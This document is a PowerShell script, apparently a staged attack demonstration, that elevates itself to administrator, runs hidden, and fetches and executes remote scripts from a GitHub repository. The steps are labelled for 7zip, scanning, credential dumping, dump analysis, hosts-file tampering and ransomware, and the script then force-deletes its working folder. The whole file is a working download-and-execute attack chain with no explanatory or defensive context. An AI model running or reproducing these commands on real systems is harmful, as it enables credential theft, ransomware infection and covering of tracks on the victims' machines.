if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell -WindowStyle Hidden "-File `"$PSCommandPath`"" -Verb RunAs; exit }

#7zip
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/crjptpp/tpplab_public/main/sedemo01/7z.ps1')"

#scanning
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/crjptpp/tpplab_public/main/sedemo01/scan.ps1')"

#DumpingCredentials
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/crjptpp/tpplab_public/main/sedemo01/cdump.ps1')"

#AnalyzeDump
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/crjptpp/tpplab_public/main/sedemo01/andump.ps1')"

#AddHosts
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/crjptpp/tpplab_public/main/sedemo01/hosts.ps1')"

#ransom
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/crjptpp/tpplab_public/main/sedemo01/ransom.ps1')"

Remove-Item C:\CRDemo -Recurse -Force
